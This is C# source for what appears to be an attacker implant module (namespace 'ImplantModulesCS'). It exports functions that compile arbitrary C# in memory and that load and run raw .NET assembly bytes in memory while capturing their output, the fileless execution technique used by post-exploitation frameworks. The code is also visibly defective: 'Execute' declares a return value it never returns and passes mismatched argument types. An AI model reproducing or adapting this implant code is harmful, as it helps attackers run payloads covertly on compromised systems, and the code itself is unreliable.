using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace ImplantModulesCS
{
    public static class ExecuteAssembly
    {
        [DllExport]
        public static void CompileNRun(string code, string Class, string method)
        {

            // Prepare parameters
            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateInMemory = true;
            parameters.GenerateExecutable = false;

            // Compile code
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);

            // Check for compilation errors
            if (results.Errors.HasErrors)
            {
                foreach (CompilerError error in results.Errors)
                {
                    Console.WriteLine(error.ErrorText);
                }
            }
            else
            {
                // Invoke the Main method of HelloWorld
                Assembly assembly = results.CompiledAssembly;
                Type program = assembly.GetType(Class);
                MethodInfo main = program.GetMethod(method);

                main.Invoke(null, null);  // Assuming the Main method doesn't need any arguments
            }
        }
        [DllExport]
        public static IntPtr Execute(byte[] asm, IntPtr[] args, int argsLength)
        {
            MemoryStream memoryStream = null;
            StreamWriter streamWriter = null;
            string output = string.Empty;

            try
            {
                var currentOut = Console.Out;
                var currentError = Console.Error;

                using (memoryStream = new MemoryStream())
                {
                    using (streamWriter = new StreamWriter(memoryStream))
                    {
                        Console.SetOut(streamWriter);
                        Console.SetError(streamWriter);

                        var assembly = Assembly.Load(asm);
                        assembly.EntryPoint.Invoke(null, new object[] { args });

                        streamWriter.Flush();  // Flush before reading from the MemoryStream

                        memoryStream.Position = 0;
                        using (StreamReader reader = new StreamReader(memoryStream))
                        {
                            output = reader.ReadToEnd();
                        }
                    }
                }

                Console.SetOut(currentOut);
                Console.SetError(currentError);
            }
            catch (Exception ex)
            {
                // Log or print the exception message
                Console.WriteLine($"An error occurred: {ex.Message}");
            }
            finally
            {
                streamWriter?.Dispose();
                memoryStream?.Dispose();
            }
        }
    }
}
